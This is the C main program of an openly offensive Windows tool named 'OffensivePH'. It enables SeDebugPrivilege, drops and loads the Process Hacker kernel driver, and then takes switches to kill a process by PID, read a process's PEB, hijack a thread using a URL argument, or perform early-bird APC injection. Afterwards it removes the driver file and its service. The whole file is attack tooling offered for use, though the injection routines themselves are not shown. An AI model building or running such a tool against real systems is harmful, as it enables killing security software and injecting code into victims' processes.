#include "base.h"
#include "kphapi.h"
#include "kphuser.h"
#include "offensive.h"
#include "extract.h"
#include <stdio.h>

#pragma comment(lib, "ntdll")

#define SERVICENAME L"kphsrv"
#define DRIVERNAME L"\\kph.sys"

BOOL EnableSeDebugPrivilege() {
	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	LUID luid = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
			TOKEN_PRIVILEGES tokenPriv = { 0 };
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luid;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
		}
	}
	return bRet;
}


int wmain(int argc, wchar_t* argv[]) {
	DWORD status = -1;
	NTSTATUS ntstatus;
	WCHAR lpServiceName[] = SERVICENAME;
	WCHAR lpFilePath[MAX_PATH] = {0};

	printf("# OffensivePH");
	printf("\n-------------------------------------------------");

	if (argc < 2) {
		printf("\n[+] Usage: offensivph.exe [-kill|-peb|-hijack|-apcinject] [<PID>] [<URL>]");
		return 0;
	}

	if (EnableSeDebugPrivilege()) {
		printf("\n[+] SeDebugPrivilege is enabled succesfully");
	}
	else {
		printf("\n[-] SeDebugPrivilege could not be enabled");
		return -5;
	}

	GetCurrentDirectory(MAX_PATH, lpFilePath);
	wcscat_s(lpFilePath, DRIVERNAME);
	status = ExtractDriver(lpFilePath);
	if (NT_SUCCESS(KphConnect2Ex(lpServiceName, lpFilePath))) {
		printf("\n[*] Connected to KprocessHacker Driver");
	}
	else {
		printf("\n[-] Failed to connect KProcessHacker Driver. Exiting...");
		goto Cleanup;
	}

	if (!wcscmp(argv[1], L"-kill"))
		status = OphTerminateProcess(_wtoi(argv[2]));
	else if (!wcscmp(argv[1], L"-peb"))
		status = OphReadProcessPEB(_wtoi(argv[2]));
	else if (!wcscmp(argv[1], L"-hijack"))
		status = OphHijackThread(_wtoi(argv[2]), argv[3]);
	else if (!wcscmp(argv[1], L"-apcinject"))
		status = OphEarlyBirdAPCInjection(argv[2]);
	else {
		printf("\n[-] Failed to parse parameter. Exiting...");
		goto Cleanup;
	}

	Cleanup:
	KphUninstall(lpServiceName);
	DeleteFile(lpFilePath);
	printf("\n[*] Service and file are removed");
	return status;
}
